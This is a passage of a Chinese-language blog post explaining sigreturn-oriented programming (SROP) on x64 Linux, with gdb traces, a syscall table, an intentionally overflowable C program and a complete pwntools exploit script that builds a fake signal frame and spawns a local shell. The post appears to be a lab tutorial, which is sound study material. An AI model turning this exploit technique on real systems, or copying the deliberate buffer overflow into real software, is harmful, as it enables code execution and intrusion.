rsi</span><br><span class="line">      0x7fffff09307a &lt;__libc_sigaction+10&gt; mov    r8, rdx</span><br><span class="line">─────────────────────────────────────────────────────────────────────────[ source:./debug_sig.c+11 ]────</span><br><span class="line">      6  #include &lt;signal.h&gt;</span><br><span class="line">      7</span><br><span class="line">      8  void handle_signal(int signum)</span><br><span class="line">      9  &#123;</span><br><span class="line">     10  printf("handling signal: %d\n", signum);</span><br><span class="line"> →   11         &#125;</span><br><span class="line">     12</span><br><span class="line">     13  int main()&#123;</span><br><span class="line">     14      signal(SIGINT, (void *)handle_signal);</span><br><span class="line">     15      printf("catch me if you can\n");</span><br><span class="line">     16      while(1) &#123;&#125;</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────[ threads ]────</span><br><span class="line">[#0] Id 1, Name: "debug_sig", stopped, reason: BREAKPOINT</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────[ trace ]────</span><br><span class="line">[#0] 0x8000763 → Name: handle_signal(signum=0x2)</span><br><span class="line">[#1] 0x7fffff093060 → Name: __restore_rt()</span><br><span class="line">[#2] 0x8000785 → Name: main()</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"></span><br><span class="line">Breakpoint 4, 0x0000000008000763 in handle_signal (signum=0x2) at ./debug_sig.c:11</span><br><span class="line">11      &#125;</span><br></pre></td></tr></table></figure>
<p>可以看到信号处理函数返回时，调用 __restore_rt() ，也就是在调用 0xf 号系统调用( sigreturn )。</p>
<h1><span id="syscall-相关">syscall 相关</span></h1><p>主要在于寻找相关的 gadgets 和系统调用参数的传递及返回值</p>
<p>调用号通过 rax 传递</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov rax,<span class="number">0xf</span></span><br><span class="line">ret</span><br><span class="line">...</span><br><span class="line">syscall</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>syscall 调用成功后返回调用号，系统调用失败后值存入 rax，系统调用失败值参阅：<a href="http://www-numi.fnal.gov/offline_software/srt_public_context/WebDocs/Errors/unix_system_errors.html" target="_blank" rel="external">http://www-numi.fnal.gov/offline_software/srt_public_context/WebDocs/Errors/unix_system_errors.html</a></p>
<p>以 x64 为例，系统调用号可查阅 inclde/generated/asm-offsets.h:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#define __NR_syscall_max 322</span><br><span class="line"></span><br><span class="line">#ifndef _ASM_X86_UNISTD_64_H</span><br><span class="line">#define _ASM_X86_UNISTD_64_H 1</span><br><span class="line"></span><br><span class="line">#define __NR_read 0</span><br><span class="line">#define __NR_write 1</span><br><span class="line">#define __NR_open 2</span><br><span class="line">#define __NR_close 3</span><br><span class="line">#define __NR_stat 4</span><br><span class="line">#define __NR_fstat 5</span><br><span class="line">#define __NR_lstat 6</span><br><span class="line">#define __NR_poll 7</span><br><span class="line">#define __NR_lseek 8</span><br><span class="line">#define __NR_mmap 9</span><br><span class="line">#define __NR_mprotect 10</span><br><span class="line">#define __NR_munmap 11</span><br><span class="line">...</span><br><span class="line">#define __NR_fork 57</span><br><span class="line">#define __NR_vfork 58</span><br><span class="line">#define __NR_execve 59</span><br><span class="line">#define __NR_exit 60</span><br><span class="line">#define __NR_wait4 61</span><br><span class="line">#define __NR_kill 62</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h1><span id="x64simple-demo">x64simple demo</span></h1><p>要点：</p>
<ul>
<li>利用 pwntools srop 可快速构造 fake signal frame</li>
<li>精心布局栈空间，完成 sigreturn 的 rop 后紧跟 fake signal frame</li>
</ul>
<p>示例代码如下：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">* just for srop simple:https://0x00sec.org/t/srop-signals-you-say/2890</span><br><span class="line">* gcc -o x64simple ./x64simple.c -g -no-pie -z execstack</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void syscall_()&#123;</span><br><span class="line">    __asm__("syscall; ret;");</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void set_rax()&#123;</span><br><span class="line">    __asm__("movl $0xf, %eax; ret;");</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    // ONLY SROP!</span><br><span class="line">    char buff[100];</span><br><span class="line">    printf("Buff @%p, can you SROP?\n", buff);</span><br><span class="line">    read(0, buff, 5000);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ checksec ./x64simple</span><br><span class="line">[*] './x64simple'</span><br><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure></p>
<p>这里为什么把保护全关呢。因为起初的利用思路是调用 mprotect 系统调用对栈内存属性改写，实现栈缓冲区可执行</p>
<p>然而在实践的过程问题却发现行不通：在 NX 的条件下，对栈缓冲区内存改写属性会失败。</p>
<h2><span id="1定位崩溃点">1.定位崩溃点</span></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">[ Legend: Modified <span class="keyword">register</span> | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────[ registers ]────</span><br><span class="line">$rax   : <span class="number">0x0</span></span><br><span class="line">$rbx   : <span class="number">0x0</span></span><br><span class="line">$rcx   : <span class="number">0x37b</span></span><br><span class="line">$rdx   : <span class="number">0x1f4</span></span><br><span class="line">$rsp   : <span class="number">0x7ffffffee238</span>      -&gt;  <span class="string">"paaaaaaaqa"</span></span><br><span class="line">$rbp   : <span class="number">0x616161616161616f</span> (<span class="string">"oaaaaaaa"</span>?)</span><br><span class="line">$rsi   : <span class="number">0x7ffffffee1c0</span>      -&gt;  <span class="string">"aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]"</span></span><br><span class="line">$rdi   : <span class="number">0x0</span></span><br><span class="line">$rip   : <span class="number">0x400599</span>            -&gt;  &lt;main+<span class="number">60</span>&gt; ret</span><br><span class="line">$r8    : <span class="number">0x1</span></span><br><span class="line">$r9    : <span class="number">0x24</span></span><br><span class="line">$r10   : <span class="number">0x37b</span></span><br><span class="line">$r11   : <span class="number">0x37b</span></span><br><span class="line">$r12   : <span class="number">0x400450</span>            -&gt;  &lt;_start+<span class="number">0</span>&gt; xor ebp, ebp</span><br><span class="line">$r13   : <span class="number">0x7ffffffee310</span>      -&gt;  <span class="number">0x0000000000000001</span></span><br><span class="line">$r14   : <span class="number">0x0</span></span><br><span class="line">$r15   : <span class="number">0x0</span></span><br><span class="line">$eflags: [CARRY PARITY adjust zero sign trap INTERRUPT direction overflow RESUME virtualx86 identification]</span><br><span class="line">$fs: <span class="number">0x0000</span>  $gs: <span class="number">0x0000</span>  $ss: <span class="number">0x002b</span>  $es: <span class="number">0x0000</span>  $ds: <span class="number">0x0000</span>  $cs: <span class="number">0x0033</span></span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────[ <span class="built_in">stack</span> ]────</span><br><span class="line"><span class="number">0x00007ffffffee238</span>|+<span class="number">0x00</span>: <span class="string">"paaaaaaaqa"</span>   &lt;- $rsp</span><br><span class="line"><span class="number">0x00007ffffffee240</span>|+<span class="number">0x08</span>: <span class="number">0x00000000000a6171</span> (<span class="string">"qa"</span>?)</span><br><span class="line"><span class="number">0x00007ffffffee248</span>|+<span class="number">0x10</span>: <span class="number">0x00007ffffffee318</span>  -&gt;  <span class="number">0x00007ffffffee51f</span>  -&gt;  <span class="string">"./x64simple[...]"</span></span><br><span class="line"><span class="number">0x00007ffffffee250</span>|+<span class="number">0x18</span>: <span class="number">0x00000001ff1c12c8</span></span><br><span class="line"><span class="number">0x00007ffffffee258</span>|+<span class="number">0x20</span>: <span class="number">0x000000000040055d</span>  -&gt;  &lt;main+<span class="number">0</span>&gt; push rbp</span><br><span class="line"><span class="number">0x00007ffffffee260</span>|+<span class="number">0x28</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x00007ffffffee268</span>|+<span class="number">0x30</span>: <span class="number">0xec7013cae5dbabc5</span></span><br><span class="line"><span class="number">0x00007ffffffee270</span>|+<span class="number">0x38</span>: <span class="number">0x0000000000400450</span>  -&gt;  &lt;_start+<span class="number">0</span>&gt; xor ebp, ebp</span><br></pre></td></tr></table></figure>
<p>通过 gdb 调试，rsp - rsi 得到 padding size == 120</p>
<h2><span id="2-寻找-gadgets">2. 寻找 gadgets</span></h2><p>利用ropper可搜寻到</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">syscall_addr = <span class="number">0x40054a</span></span><br><span class="line">mov_eax_15_ret = <span class="number">0x400554</span></span><br></pre></td></tr></table></figure>
<h2><span id="3fake-signal-frame">3.fake signal frame</span></h2><p>调用 execve 系统调用，可直接使用 pwntools 中的 srop 框架<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">frame = SigreturnFrame()</span><br><span class="line"><span class="comment"># execve syscall number == 59</span></span><br><span class="line">frame.rax = <span class="number">59</span> <span class="comment"># execve syscall number</span></span><br><span class="line">frame.rdi = buff_addr</span><br><span class="line">frame.rsi = <span class="number">0</span> </span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line"><span class="comment"># signal frame size == 248</span></span><br><span class="line">frame.rsp = buff_addr + len(payload) + <span class="number">248</span></span><br><span class="line"><span class="comment"># SET RIP TO SYSCALL ADDRESS</span></span><br><span class="line">frame.rip = syscall_ret</span><br></pre></td></tr></table></figure></p>
<h2><span id="4完整-exp-及-getshell">4.完整 exp 及 getshell</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-* coding:utf-8 *-</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from Frame import SigreturnFrame</span></span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line"><span class="comment"># context.log_level = "DEBUG"</span></span><br><span class="line"></span><br><span class="line">mov_eax_15_ret = <span class="number">0x400554</span></span><br><span class="line">syscall_ret = <span class="number">0x40054a</span></span><br><span class="line">main_addr = <span class="number">0x400565</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./x64simple"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.leak buffer addr</span></span><br><span class="line">p.recvuntil(<span class="string">"Buff @0x"</span>)</span><br><span class="line">buff_addr = int(p.recvuntil(<span class="string">","</span>)[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"buff addr:"</span>,hex(buff_addr)</span><br><span class="line">p.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">binsh = <span class="string">"/bin/sh\x00"</span></span><br><span class="line"></span><br><span class="line">payload = binsh + (<span class="number">120</span>-len(binsh))*<span class="string">'\x90'</span></span><br><span class="line"><span class="comment"># why? sigreturn syscall number is 15,syscall arg by eax passed</span></span><br><span class="line">payload += p64(mov_eax_15_ret) + p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame() <span class="comment"># CREATING A SIGRETURN FRAME</span></span><br><span class="line">frame.rax = <span class="number">59</span></span><br><span class="line">frame.rdi = buff_addr</span><br><span class="line">frame.rsi = <span class="number">0</span> </span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rsp = buff_addr + len(payload) + <span class="number">248</span> <span class="comment"># WHERE 248 IS SIZE OF FAKE FRAME!</span></span><br><span class="line">frame.rip = syscall_ret <span class="comment"># SET RIP TO SYSCALL ADDRESS</span></span><br><span class="line"><span class="comment"># PLACE FAKE FRAME ON STACK</span></span><br><span class="line"><span class="comment"># payload += p64(main_addr) + str(frame)</span></span><br><span class="line">payload += str(frame)</span><br><span class="line">payload += p64(main_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># wait for debuger</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">$python ./pwn_x64simple.py </span><br><span class="line">[+] Starting local process <span class="string">'./x64simple'</span>: pid <span class="number">13214</span></span><br><span class="line">buff addr: <span class="number">0x7ffeb5211770</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ whoami</span><br><span class="line">asan</span><br></pre></td></tr></table></figure>
<h1><span id="reference">Reference</span></h1><ul>
<li>sides:<a href="https://tc.gtisc.gatech.edu/bss/2014/r/srop-slides.pdf" target="_blank" rel="external">https://tc.gtisc.gatech.edu/bss/2014/r/srop-slides.pdf</a></li>
<li>paper:<a href="http://www.ieee-security.org/TC/SP2014/papers/FramingSignals-AReturntoPortableShellcode.pdf" target="_blank" rel="external">http://www.ieee-security.org/TC/SP2014/papers/FramingSignals-AReturntoPortableShellcode.pdf</a></li>
<li><a href="http://www.freebuf.com/articles/network/87447.html" target="_blank" rel="external">http://www.freebuf.com/articles/network/87447.html</a></li>
<li>示例：<a href="https://0x00sec.org/t/srop-signals-you-say/2890" target="_blank" rel="external">https://0x00sec.org/t/srop-signals-you-say/2890</a></li>
<li><a href="https://elixir.bootlin.com/linux/v4.6/source/arch/x86/include/uapi/asm/sigcontext.h" target="_blank" rel="external">https://elixir.bootlin.com/linux/v4.6/source/arch/x86/include/uapi/asm/sigcontext.h</a></li>
<li><a href="http://www-numi.fnal.gov/offline_software/srt_public_context/WebDocs/Errors/unix_system_errors.html" target="_blank" rel="external">http://www-numi.fnal.gov/offline_software/srt_public_context/WebDocs/Errors/unix_system_errors.html</a></li>
</ul>

      
    </div>

    <div>
      
        
      
    </div>

    <div>
      
        

      
    </div>

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/exp/" rel="tag">#exp</a>
          
            <a href="/tags/signal/" rel="tag">#signal</a>
          
            <a href="/tags/syscall/" rel="tag">#syscall</a>
          
        </div>
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2018/10/21/stkof_detail/" rel="next" title="stkof heap unlink 实战详解">
                <i class="fa fa-chevron-left"></i> stkof heap unlink 实战详解
              </a>
            
          </div>

          <div class="post-nav-prev post-nav-item">
            
          </div>
        </div>
      

      
      
    </footer>
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          
  <div class="comments" id="comments">
    
      <div id="disqus_thread">
        <noscript>
          Please enable JavaScript to view the
          <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a>
        </noscript>
      </div>
    
  </div>


        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview sidebar-panel ">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image"
               src="/images/avatar.gif"
               alt="Asan" />
          <p class="site-author-name" itemprop="name">Asan</p>
          <p class="site-description motion-element" itemprop="description">Asanzjx Personal Blog</p>
        </div>
        <nav class="site-state motion-element">
          <div class="site-state-item site-state-posts">
            <a href="/archives">
              <span class="site-state-item-count">42</span>
              <span class="site-state-item-name">日志</span>
            </a>
          </div>

          
            <div class="site-state-item site-state-categories">
              <a href="/categories">
                <span class="site-state-item-count">15</span>
                <span class="site-state-item-name">分类</span>
              </a>
            </div>
          

          
            <div class="site-state-item site-state-tags">
              <a href="/tags">
                <span class="site-state-item-count">56</span>
                <span class="site-state-item-name">标签</span>
              </a>
            </div>
          

        </nav>

        
          <div class="feed-link motion-element">
            <a href="/atom.xml" rel="alternate">
              <i class="fa fa-rss"></i>
              RSS
            </a>
          </div>
        

        <div class="links-of-author motion-element">
          
        </div>

        
        

        
        

      </section>

      
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">
            
              
            
            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#undefined"><span class="nav-number">1.</span> <span class="nav-text">Signal mechanism 下内核与进程的交互</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#undefined"><span class="nav-number">2.</span> <span class="nav-text">Debugger signal and find signal frame struct</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#undefined"><span class="nav-number">3.</span> <span class="nav-text">syscall 相关</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#undefined"><span class="nav-number">4.</span> <span class="nav-text">x64simple demo</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">4.1.</span> <span class="nav-text">1.定位崩溃点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">4.2.</span> <span class="nav-text">2. 寻找 gadgets</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">4.3.</span> <span class="nav-text">3.fake signal frame</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">4.4.</span> <span class="nav-text">4.完整 exp 及 getshell</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#undefined"><span class="nav-number">5.</span> <span class="nav-text">Reference</span></a></li></ol></div>
            
          </div>
        </section>
      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy; 
  <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Asan</span>
</div>

<div class="powered-by">
  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
</div>

<div class="theme-info">
  主题 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Mist
  </a>
</div>

        

        
      </div>
    </footer>

    <div class="back-to-top">
      <i class="fa fa-arrow-up"></i>
    </div>
  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  



  
  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/vendors/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>



  



  

    <script type="text/javascript">
      var disqus_shortname = 'asanzjx';
      var disqus_identifier = '2018/10/21/srop_detail/';
      var disqus_title = "srop 利用方式";
      var disqus_url = 'https://asanzjx.github.io/2018/10/21/srop_detail/';

      function run_disqus_script(disqus_script){
        var dsq = document.createElement('script');
        dsq.type = 'text/javascript';
        dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
      }

      run_disqus_script('count.js');
      
        run_disqus_script('embed.js');
      
    </script>
  




  
  
  

  

  

</body>
</html>
